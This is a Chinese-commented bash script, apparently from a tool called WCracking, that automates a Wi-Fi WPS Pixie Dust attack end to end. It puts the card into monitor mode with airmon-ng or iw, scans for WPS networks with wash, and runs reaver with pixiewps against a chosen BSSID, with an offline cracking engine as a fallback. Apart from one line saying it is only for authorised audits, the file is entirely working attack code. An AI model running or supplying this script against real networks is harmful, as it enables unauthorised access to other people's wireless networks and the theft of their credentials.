#!/usr/bin/env bash
# WCracking Linux 一键 WPS 攻击：监听模式 -> 扫描 -> reaver Pixie Dust
# 用法：
#   bash linux/attack.sh <wlan0>             # 扫描附近 WPS 网络
#   bash linux/attack.sh <wlan0> <BSSID>     # 指定目标直接 Pixie Dust 攻击
# 仅限对本人拥有或已获书面授权的网络进行安全审计。
set -e

IFACE="${1:?用法: $0 <wlan接口> [BSSID]}"
BSSID="${2:-}"

echo "[*] WCracking Linux 攻击流程"
echo "[*] 接口: $IFACE"

# 1. 清理干扰进程
echo "[*] 停止可能干扰的网络进程……"
sudo airmon-ng check kill 2>/dev/null || true

# 2. 进入监听模式
echo "[*] 进入监听模式……"
sudo airmon-ng start "$IFACE" 2>/dev/null || true
MON="${IFACE}mon"
# 有些系统用 iw 更可靠
if ! sudo iw dev "$MON" info >/dev/null 2>&1; then
    echo "[*] airmon-ng 未生成 ${MON}，改用 iw……"
    sudo ip link set "$IFACE" down
    sudo iw dev "$IFACE" set type monitor
    sudo ip link set "$IFACE" up
    MON="$IFACE"
fi

# 3. 扫描（未指定 BSSID 时）
if [ -z "$BSSID" ]; then
    echo "[*] 扫描附近 WPS 网络（Ctrl-C 停止）……"
    sudo wash -i "$MON" -C || true
    echo
    echo "[*] 从上表复制目标 BSSID，然后运行："
    echo "    bash linux/attack.sh $IFACE <BSSID>"
    exit 0
fi

# 4. Pixie Dust 攻击（reaver 内置，-K 1 自动调用 pixiewps）
echo "[*] 对 $BSSID 发起 Pixie Dust 攻击……"
sudo reaver -i "$MON" -b "$BSSID" -vv -K 1

echo
echo "[*] 攻击结束。若 reaver 内置 pixiewps 未命中，"
echo "    可把 reaver 输出的 AuthKey/PKE/E-Hash 喂给离线引擎："
echo "    python core/pixie_dust.py --pke ... --pkr ... --e-hash1 ... --e-hash2 ... --authkey ... --e-nonce ..."
